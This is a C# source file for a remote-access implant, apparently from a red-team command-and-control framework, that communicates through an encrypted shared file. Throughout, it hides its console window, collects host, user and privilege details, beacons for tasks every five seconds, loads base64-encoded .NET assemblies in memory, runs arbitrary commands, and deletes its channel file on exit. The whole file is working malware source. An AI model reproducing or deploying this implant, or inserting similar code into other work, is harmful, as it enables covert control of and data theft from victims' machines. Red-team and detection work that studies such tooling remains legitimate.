using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;


public class Program
{
    public static string input;
    public static bool kill;
    public static string filename;
    public static string encryption;
    public static string output;
    public static bool running;
    public static bool initialised;
    public static FCClient FComm;
    private static StringWriter backgroundTaskOutput = new StringWriter();
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    public const int SW_HIDEN = 0;
    public const int SW_SHOW = 5;


    public static void Sharp()
    {
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDEN);
        Program.filename = @"#REPLACEFCOMMFILENAME#";
        Program.encryption = @"#REPLACEKEY#";
        Program.kill = false;
        FCommConnect();

    }

    public static void Main()
    {
        Sharp();
    }

    static bool ihInteg()
    {
        System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
        System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
        return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
    }

    private static void FCommConnect()
    {
        //initialise the implant.

        if (initialised == false)
        {
            string u = "";
            try
            {
                u = WindowsIdentity.GetCurrent().Name;
            }
            catch
            {
                u = Environment.UserName;
            }
            if (ihInteg()) {
                u += "*";
            }
            string dn = Environment.UserDomainName;
            string cn = Environment.GetEnvironmentVariable("COMPUTERNAME");
            string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            int pid = Process.GetCurrentProcess().Id;
            Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
            string hostinfo = String.Format("FComm-Connected: {0};{1};{2};{3};{4};", dn, u, cn, arch, pid);
            FComm = new FCClient(filename, hostinfo, encryption);
            initialised = true;

        }

        try
        {
            running = true;
            while (running)
            {
                if (initialised == true)
                {
                    var output = new StringBuilder();

                    //DANGER: Removing this could end up absolutely spanking the CPU, this is effectively Beacon Time for the implant.
                    Thread.Sleep(5000); //fixed beacon time.

                    FCDataGram Task = FComm.GetCurrentTasking();
                    if (Task == null)
                    {
                        //Nothing to do.
                        continue;
                    }

                    if (Task.Actioned == true)
                    {
                        //The task in the file has been actioned already.
                        continue;
                    }

                    var cmd = Task.Input;
                    var sOutput2 = new StringWriter(); //Setup stringwriter to buffer output from command.
                    if (cmd.ToLower().StartsWith("kill-implant"))
                    {
                        running = false;
                        initialised = false;
                        sOutput2.WriteLine("[!] Killed Implant.");
                        FComm.CleanUp();
                        FComm = null;
                    }
                    else if (cmd.ToLower().StartsWith("loadmodule"))
                    {
                        try
                        {
                            var module = Regex.Replace(cmd, "loadmodule", "", RegexOptions.IgnoreCase);
                            var assembly = Assembly.Load(Convert.FromBase64String(module));
                        }
                        catch (Exception e) { sOutput2.WriteLine($"Error loading modules {e}"); }
                        sOutput2.WriteLine("Module loaded successfully");
                    }
                    else if (cmd.ToLower().StartsWith("run-dll-background") || cmd.ToLower().StartsWith("run-exe-background"))
                    {
                        sOutput2.WriteLine("[!] This is not implemented yet in FComm implant types.");
                        //This might not work!? Need to consider how to approach this.
                        /*
                        Thread t = new Thread(() => RunAssembly(cmd, true));
                        t.Start();
                        sOutput2.WriteLine("[+] Running task in background, run get-bg to get background output.");
                        sOutput2.WriteLine("[*] Only run one task in the background at a time per implant.");
                        */
                    }
                    else if (cmd.ToLower().StartsWith("run-dll") || cmd.ToLower().StartsWith("run-exe"))
                    {
                        var oldOutput = Console.Out; //redirecting output
                        Console.SetOut(sOutput2);
                        sOutput2.WriteLine(RunAssembly((cmd)));
                        Console.SetOut(oldOutput); //redirecting it back.
                    }
                    else if (cmd.ToLower() == "foo")
                    {
                        sOutput2.WriteLine("bar");
                    }
                    else if (cmd.ToLower() == "get-bg")
                    {
			//Removing this as Rob says this should just work, but it's not been properly tested yet.
			sOutput2.WriteLine("[!] This is not implemented yet in FComm implant types.");
                        /*
                        var backgroundTaskOutputString = backgroundTaskOutput.ToString();
                        if (!string.IsNullOrEmpty(backgroundTaskOutputString))
                        {
                            output.Append(backgroundTaskOutputString); //check later.
                        }
                        else
                        {
                            sOutput2.WriteLine("[-] No output");
                        }*/
                    }
                    else
                    {
                        var oldOutput = Console.Out;
                        Console.SetOut(sOutput2);
                        sOutput2.WriteLine(RunAssembly($"run-exe Core.Program Core {cmd}"));
                        Console.SetOut(oldOutput);
                    }

                    output.Append(sOutput2.ToString());
                    Task.Output = Convert.ToBase64String(Encoding.UTF8.GetBytes(output.ToString()));
                    Task.Actioned = true;
                    FComm.UpdateTask(Task);
                    output.Clear();
                    output.Length = 0;
                    sOutput2.Flush();
                    sOutput2.Close();
                    
                }
            }
        }

        catch (Exception e)
        {
            Console.WriteLine("Error: " + e.Message);
            Console.WriteLine(e.StackTrace);
        }
    }

    [DllImport("shell32.dll")] static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);
    private static string[] ParseCommandLineArgs(string cl)
    {
        int argc;
        var argv = CommandLineToArgvW(cl, out argc);
        if (argv == IntPtr.Zero)
            throw new System.ComponentModel.Win32Exception();
        try
        {
            var args = new string[argc];
            for (var i = 0; i < args.Length; i++)
            {
                var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
                args[i] = Marshal.PtrToStringUni(p);
            }

            return args;
        }
        finally
        {
            Marshal.FreeHGlobal(argv);
        }
    }

    private static Type LoadAssembly(string assemblyName)
    {
        return Type.GetType(assemblyName, (name) =>
        {
            return AppDomain.CurrentDomain.GetAssemblies().Where(z => z.FullName == name.FullName).LastOrDefault();
        }, null, true);
    }

    private static string RunAssembly(string c, bool background = false)
    {

        var oldOutput = Console.Out;
        if (background)
        {
            backgroundTaskOutput = new StringWriter();
            Console.SetOut(backgroundTaskOutput);
        }
        var splitargs = c.Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
        int i = 0;
        var sOut = "";
        string sMethod = "", sta = "", qNme = "", name = "";
        foreach (var a in splitargs)
        {
            if (i == 1)
                qNme = a;
            if (i == 2)
                name = a;
            if (c.ToLower().StartsWith("run-exe"))
            {
                if (i > 2)
                    sta = sta + " " + a;
            }
            else
            {
                if (i == 3)
                    sMethod = a;
                else if (i > 3)
                    sta = sta + " " + a;
            }
            i++;
        }
        string[] l = ParseCommandLineArgs(sta);
        var asArgs = l.Skip(1).ToArray();
        foreach (var Ass in AppDomain.CurrentDomain.GetAssemblies())
        {
            if (Ass.FullName.ToString().ToLower().StartsWith(name.ToLower()))
            {
                var lTyp = LoadAssembly(qNme + ", " + Ass.FullName);
                try
                {
                    if (c.ToLower().StartsWith("run-exe"))
                    {
                        object output = null;
                        output = lTyp.Assembly.EntryPoint.Invoke(null, new object[] { asArgs });
                        if (output != null)
                        {
                            sOut = output.ToString();
                        }
                    }
                    else
                    {
                        try
                        {
                            object output = null;
                            output = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, asArgs).ToString();
                            if (output != null)
                            {
                                sOut = output.ToString();
                            }
                        }
                        catch
                        {
                            object output = null;
                            output = lTyp.Assembly.GetType(qNme).InvokeMember(sMethod, BindingFlags.Public | BindingFlags.InvokeMethod | BindingFlags.Static, null, null, null).ToString();
                            if (output != null)
                            {
                                sOut = output.ToString();
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("RAsm Exception: " + e.Message);
                    Console.WriteLine(e.StackTrace);
                }
                break;
            }
        }
        if (background)
        {
            Console.SetOut(oldOutput);
            backgroundTaskOutput.WriteLine(sOut);
        }
        return sOut;
    }


}


public class FCDataGram
{
    public string PacketType { get; set; }
    public string Input { get; set; }
    public string Output { get; set; }
    public bool Actioned { get; set; }
    public bool Retrieved { get; set; }

    public FCDataGram()
    {
        Actioned = false;
        Retrieved = false;
    }

    public FCDataGram(string[] objContents)
    {
        PacketType = objContents[0];
        Input = objContents[1];
        Output = objContents[2];
        Actioned = bool.Parse(objContents[3]);
        Retrieved = bool.Parse(objContents[4]);
    }

    public FCDataGram(string objContents)
    {
        char[] delim = { ',' };
        FromStringArray(objContents.Split(delim));
    }

    public override string ToString()
    {
        return string.Join(",", ToStringArray());
    }

    public string[] ToStringArray()
    {
        return new string[] { PacketType, Input, Output, Actioned.ToString(), Retrieved.ToString() };
    }

    public void FromStringArray(string[] objContents)
    {
        PacketType = objContents[0];
        Input = objContents[1];
        Output = objContents[2];
        Actioned = bool.Parse(objContents[3]);
        Retrieved = bool.Parse(objContents[4]);
    }
}

public class FCClient
{
    //Client is the far end of this connection.
    private string FilePath;
    private string Key;
    public FCClient(string FilePath_In, string HostInfo, string key)
    {
        //initialise object.
        try
        {
            FilePath = FilePath_In;
            Key = key;
            string path = Path.GetDirectoryName(FilePath_In);
            string filename = Path.GetFileName(FilePath_In);
            Directory.CreateDirectory(path); //Create the full path if it doesn't exist.
            var f = File.Create(FilePath_In); //create the file if it doesn't exist. Probably worth putting more sanity checks here.
            f.Close();
            f.Dispose();
            //lets populate it with the info we need.
            FCDataGram InitialContent = new FCDataGram() { PacketType = "INIT", Input = "initial", Output = Convert.ToBase64String(Encoding.UTF8.GetBytes(HostInfo)), Actioned = true };
            SendData(InitialContent);
        }
        catch (SecurityException e)
        {
            Console.WriteLine(e.Message);
        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);
        }
    }

    public void Tasking(string input)
    {
        FCDataGram Task = new FCDataGram() { PacketType = "TASK", Input = input, Output = "", Actioned = false };

    }

    public FCDataGram GetCurrentTasking() {
        //Just to make the methods seem sensible.
        return GetData();
    }
    public void UpdateTask(FCDataGram Task) {
        //Just to make the methods seem sensible.
        SendData(Task);
    }

    private void SafeFileWrite(string data)
    {
        //Guaranteed File Write.
        FileStream f = null;
        while (f == null)
        {
            try
            {
                f = new FileStream(FilePath, FileMode.Create, FileAccess.Write);
                StreamWriter sr = new StreamWriter(f);
                sr.WriteLine(data);
                sr.Close();
                f.Close();
                sr.Dispose();
                f.Dispose();
            }
            catch (IOException)
            {
                Thread.Sleep(200); // small sleep to wait before we loop to try again. Probably worth having an attempts limit, but could also massively break everything. Need to think about it.
            }
        }
    }
    private string SafeFileRead()
    {
        string StrTask = "";
        int counter = 0;
        FileStream f = null;
        while (f == null)
        {
            try
            {
                f = new FileStream(FilePath, FileMode.Open, FileAccess.Read);
                StreamReader sr = new StreamReader(f);
                string line;
                while ((line = sr.ReadLine()) != null)
                {
                    if (counter > 1)
                    {
                        throw new Exception();
                    }
                    //This should only happen once. Should. SHOULD. but it wont. so above it'll throw an exception.
                    StrTask = (line);
                    counter++;
                }
                sr.Close();
                f.Close();
                sr.Dispose();
                f.Dispose();
            }
            catch (IOException)
            {
                Thread.Sleep(500); // As above, small sleep to wait before we loop to try again. Probably need to do this more gracefully but not sure how to just yet.
            }
        }
        return StrTask;
    }

    private void SendData(FCDataGram DataToSend)
    {
        //Turn object into a string.
        //encrypt it
        //write it.
        SafeFileWrite(Encrypt(Key, DataToSend.ToString()));
    }

    private FCDataGram GetData()
    {
        //Get the contents of the file.
        //Decrypt it
        //Create a DataGram.
        return new FCDataGram(Decrypt(Key, SafeFileRead()));
    }

    public void CleanUp()
    {
        //maybe utilise POSH SHRED here?
        File.Delete(FilePath);
    }
    private static string Decrypt(string key, string ciphertext)
    {
        var rawCipherText = Convert.FromBase64String(ciphertext);
        var IV = new Byte[16];
        Array.Copy(rawCipherText, IV, 16);
        try
        {
            var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV));
            var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
            //return decrypted;
            //return decrypted.Where(x => x > 0).ToArray();
            return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
        }
        catch
        {
            var algorithm = CreateEncryptionAlgorithm(key, Convert.ToBase64String(IV), false);
            var decrypted = algorithm.CreateDecryptor().TransformFinalBlock(rawCipherText, 16, rawCipherText.Length - 16);
            //return decrypted;
            return Encoding.UTF8.GetString(decrypted.Where(x => x > 0).ToArray());
            //return decrypted.Where(x => x > 0).ToArray();
        }
        finally
        {
            Array.Clear(rawCipherText, 0, rawCipherText.Length);
            Array.Clear(IV, 0, 16);
        }

    }

    private static string Encrypt(string key, string un, bool comp = false, byte[] unByte = null)
    {
        byte[] byEnc;
        if (unByte != null)
            byEnc = unByte;
        else
            byEnc = Encoding.UTF8.GetBytes(un);

        if (comp)
            byEnc = GzipCompress(byEnc);

        try
        {
            var a = CreateEncryptionAlgorithm(key, null);
            var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
            return Convert.ToBase64String(CombineArrays(a.IV, f));
        }
        catch
        {
            var a = CreateEncryptionAlgorithm(key, null, false);
            var f = a.CreateEncryptor().TransformFinalBlock(byEnc, 0, byEnc.Length);
            return Convert.ToBase64String(CombineArrays(a.IV, f));
        }
    }

    private static SymmetricAlgorithm CreateEncryptionAlgorithm(string key, string IV, bool rij = true)
    {
        SymmetricAlgorithm algorithm;
        if (rij)
            algorithm = new RijndaelManaged();
        else
            algorithm = new AesCryptoServiceProvider();

        algorithm.Mode = CipherMode.CBC;
        algorithm.Padding = PaddingMode.Zeros;
        algorithm.BlockSize = 128;
        algorithm.KeySize = 256;

        if (null != IV)
            algorithm.IV = Convert.FromBase64String(IV);
        else
            algorithm.GenerateIV();

        if (null != key)
            algorithm.Key = Convert.FromBase64String(key);

        return algorithm;
    }

    private static byte[] GzipCompress(byte[] raw)
    {
        using (MemoryStream memory = new MemoryStream())
        {
            using (GZipStream gzip = new GZipStream(memory, CompressionMode.Compress, true))
            {
                gzip.Write(raw, 0, raw.Length);
            }
            return memory.ToArray();
        }
    }

    private static byte[] CombineArrays(byte[] first, byte[] second)
    {
        byte[] ret = new byte[first.Length + second.Length];
        Buffer.BlockCopy(first, 0, ret, 0, first.Length);
        Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
        return ret;
    }
}
